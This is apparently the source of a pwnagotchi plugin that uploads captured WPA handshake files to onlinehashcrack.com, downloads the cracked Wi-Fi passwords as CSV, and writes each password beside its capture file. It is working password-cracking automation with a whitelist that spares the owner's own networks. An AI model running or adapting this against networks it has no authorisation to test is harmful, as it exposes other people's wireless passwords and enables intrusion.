import os
import csv
import logging
import re
import requests
from datetime import datetime
from threading import Lock
from pwnagotchi.utils import StatusFile, remove_whitelisted
from pwnagotchi import plugins
from json.decoder import JSONDecodeError


class OnlineHashCrack(plugins.Plugin):
    __author__ = '33197631+dadav@users.noreply.github.com'
    __version__ = '2.1.5'
    __license__ = 'GPL3'
    __description__ = 'This plugin automatically uploads handshakes to https://onlinehashcrack.com'
    __name__ = 'OnlineHashCrack'
    __help__ = """
    This plugin automatically uploads handshakes to https://onlinehashcrack.com
    """
    __dependencies__ = {
        'pip': ['requests']
    }
    __defaults__ = {
        'enabled': False,
        'email': '',
        'dashboard': '',
        'single_files': False,
        'whitelist': [],
    }

    def __init__(self):
        self.ready = False
        try:
            self.report = StatusFile('/root/.ohc_uploads', data_format='json')
        except JSONDecodeError:
            os.remove('/root/.ohc_uploads')
            self.report = StatusFile('/root/.ohc_uploads', data_format='json')
        self.skip = list()
        self.lock = Lock()
        self.shutdown = False

    def on_config_changed(self, config):
        with self.lock:
            self.options['whitelist'] = list(set(self.options['whitelist'] + config['main']['whitelist']))

    def on_before_shutdown(self):
        self.shutdown = True

    def on_loaded(self):
        """
        Gets called when the plugin gets loaded
        """
        if not self.options['email']:
            logging.error("[ohc] Email isn't set. Can't upload to onlinehashcrack.com")
            return

        self.ready = True
        logging.info("[ohc] OnlineHashCrack plugin loaded.")

    def _upload_to_ohc(self, path, timeout=30):
        """
        Uploads the file to onlinehashcrack.com
        """
        with open(path, 'rb') as file_to_upload:
            data = {'email': self.options['email']}
            payload = {'file': file_to_upload}

            try:
                result = requests.post('https://api.onlinehashcrack.com',
                                       data=data,
                                       files=payload,
                                       timeout=timeout)
                if 'already been sent' in result.text:
                    logging.debug(f"[ohc] {path} was already uploaded.")
            except requests.exceptions.RequestException as e:
                logging.debug(f"[ohc] Got an exception while uploading {path} -> {e}")
                raise e

    def _download_cracked(self, save_file, timeout=120):
        """
        Downloads the cracked passwords and saves them

        returns the number of downloaded passwords
        """
        try:
            s = requests.Session()
            s.get(self.options['dashboard'], timeout=timeout)
            result = s.get('https://www.onlinehashcrack.com/wpa-exportcsv', timeout=timeout)
            result.raise_for_status()
            with open(save_file, 'wb') as output_file:
                output_file.write(result.content)
        except requests.exceptions.RequestException as req_e:
            raise req_e
        except OSError as os_e:
            raise os_e

    def on_webhook(self, path, request):
        import requests
        from flask import redirect
        s = requests.Session()
        s.get('https://www.onlinehashcrack.com/dashboard')
        r = s.post('https://www.onlinehashcrack.com/dashboard', data={'emailTasks': self.options['email'], 'submit': ''})
        return redirect(r.url, code=302)

    def on_internet_available(self, agent):
        """
        Called in manual mode when there's internet connectivity
        """

        if not self.ready or self.lock.locked() or self.shutdown:
            return

        with self.lock:
            display = agent.view()
            config = agent.config()
            reported = self.report.data_field_or('reported', default=list())
            handshake_dir = config['bettercap']['handshakes']
            handshake_filenames = os.listdir(handshake_dir)
            handshake_paths = [os.path.join(handshake_dir, filename) for filename in handshake_filenames if
                               filename.endswith('.pcap')]
            # pull out whitelisted APs
            handshake_paths = remove_whitelisted(handshake_paths, self.options['whitelist'])
            handshake_new = set(handshake_paths) - set(reported) - set(self.skip)
            if handshake_new:
                logging.info("[ohc] Internet connectivity detected. Uploading new handshakes to onlinehashcrack.com")
                for idx, handshake in enumerate(handshake_new):
                    if self.shutdown:
                        return
                    display.set('status',
                                f"Uploading handshake to onlinehashcrack.com ({idx + 1}/{len(handshake_new)})")
                    display.update(force=True)
                    try:
                        self._upload_to_ohc(handshake)
                        if handshake not in reported:
                            reported.append(handshake)
                            self.report.update(data={'reported': reported})
                            logging.debug(f"[ohc] Successfully uploaded {handshake}")
                    except requests.exceptions.RequestException as req_e:
                        self.skip.append(handshake)
                        logging.debug("[ohc] %s", req_e)
                        continue
                    except OSError as os_e:
                        self.skip.append(handshake)
                        logging.debug("[ohc] %s", os_e)
                        continue
            if 'dashboard' in self.options and self.options['dashboard']:
                cracked_file = os.path.join(handshake_dir, 'onlinehashcrack.cracked')
                if os.path.exists(cracked_file):
                    last_check = datetime.fromtimestamp(os.path.getmtime(cracked_file))
                    if last_check is not None and ((datetime.now() - last_check).seconds / (60 * 60)) < 1:
                        return
                try:
                    self._download_cracked(cracked_file)
                    logging.info("[ohc] Downloaded cracked passwords.")
                except requests.exceptions.RequestException as req_e:
                    logging.debug("[ohc] %s", req_e)
                except OSError as os_e:
                    logging.debug("[ohc] %s", os_e)
                if 'single_files' in self.options and self.options['single_files']:
                    with open(cracked_file, 'r') as cracked_list:
                        for row in csv.DictReader(cracked_list):
                            if row['password']:
                                filename = re.sub(r'[^a-zA-Z0-9]', '', row['ESSID']) + '_' + row['BSSID'].replace(':', '')
                                if os.path.exists(os.path.join(handshake_dir, filename + '.pcap')):
                                    with open(os.path.join(handshake_dir, filename + '.pcap.cracked'), 'w') as f:
                                        f.write(row['password'])
